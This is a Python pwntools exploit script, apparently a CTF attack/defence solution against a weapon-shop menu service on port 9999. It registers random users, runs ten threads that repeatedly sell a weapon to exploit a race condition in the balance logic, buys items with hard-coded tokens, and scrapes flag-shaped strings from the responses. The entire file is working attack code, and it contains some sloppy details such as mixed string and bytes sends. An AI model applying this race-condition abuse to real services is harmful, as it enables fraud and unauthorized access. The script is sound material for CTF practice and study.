#!/usr/bin/env python3

import socket
from pwn import *
import threading
import sys
import string
import time

alph = string.ascii_lowercase + string.ascii_uppercase

PORT = 9999
g_host = None

def idg( size = 8, chars = alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )

def sell_weapon( sock ):
	sock.send( b"3\n" )
	sock.recvuntil( b"id: " )
	sock.send( b"0\n" )
	sock.recvuntil( b"[y\\n]: " )
	sock.send( b"y\n" )
	sock.recvuntil( b"[y\\n]: " )
	sock.send( b"n\n" )
	sock.recvuntil( b"weapon?[y\\n]: " )
	sock.send( b"y\n" )

def reg_user( sock, username, password ):
	sock.recvuntil( b"> " ) # skip banner and menu
	sock.send( b"2\n" ) # send reg cmd
	sock.recvuntil( b": " ) # Enter username: 
	sock.send( username.encode() + b'\n' )
	sock.recv()

	sock.send( password.encode() + b'\n' )
	sock.recvuntil( b"> " )

def race_worker():
	global g_host
	try:
		s = remote( g_host, PORT )
		reg_user( s, idg(), idg() )

		sell_weapon( s )
		s.recvuntil( b"> " )
		for i in range( 50 ):
			s.send( b"2\n" )
			s.recvuntil( b"> " )
			s.send( b"4\n" )
			s.recvuntil( b"> " )

		s.send( b"7\n" )
		s.recvuntil( b"> " )
		s.send( b"3\n" )
		s.close()
	except:
		pass

if __name__ == "__main__":

	if len( sys.argv ) > 1:
		g_host = sys.argv[ 1 ]
	else:
		print( "[-] Usage: python3 {} host".format( sys.argv[ 0 ] ) )
		sys.exit( 1 )

	threads = []
	s = remote( g_host, PORT, timeout=15 )
	s.settimeout( 15 )
	username, password =  idg(), idg()
	print( username, password )
	reg_user( s, username, password )

	for i in range( 10 ):
		wrk = threading.Thread( target=race_worker )
		wrk.start()
		threads.append( wrk )

	sell_weapon( s )
	s.recv()
	s.send( "\n5\n" )
	s.recv()
	s.send( "0\n" )

	s.interactive()
	s.send( b"2\n" )
	s.recvuntil( b"> " )
	s.send( b"4\n" )
	s.recvuntil( b"> " )
	s.send( b"6\n" )
	s.recvuntil( b"> " )
	
	s.send( b"3\n" )
	data = s.recvline()
	print( data )
	if b"have" in data:
		print( "race not worked!" )
		sys.exit( -1 )

	s.recvuntil( b"id: " )
	s.send( b"0\n" )
	s.recvuntil( b"[y\\n]: " )
	s.send( b"y\n" )
	s.recvuntil( b"[y\\n]: " )
	s.send( b"y\n" )
	s.recvuntil( b": " )
	s.send( b"test\n" )
	s.recvuntil( b"weapon?[y\\n]: " )
	s.send( b"y\n" )

	s.recvuntil( b"> " )
	s.send( b"2\n" )
	s.recvuntil( b"> " )
	s.send( "1\n" )
	
	attack_data = ['1214843501', '3591948004']
	s.recvuntil( b"[?] Enter item token: " )
	s.send( attack_data[0].encode() + b'\n' )
	data = s.recv()

	if b"You dont have money to buy this" in data:
		print( "no flags!" )
		sys.exit( -1 )
	else:
		s.send( b"y\n" )

		data = s.recvuntil( "4. Exit\n> " )
		print( re.findall( "[A-Z0-9]{31}=", data.decode() ) )

		for i in range( 1, len( attack_data ) ):
			s.send( "1\n" )
			s.recvuntil( b"[?] Enter item token: " )
			s.send( attack_data[ i ].encode() + b'\n' )
			s.recv()
			s.send( b"y\n" )

			data = s.recvuntil( "4. Exit\n> " )
			print( re.findall( "[A-Z0-9]{31}=", data.decode() ) )

	s.interactive()

	for i in threads:
		i.join()

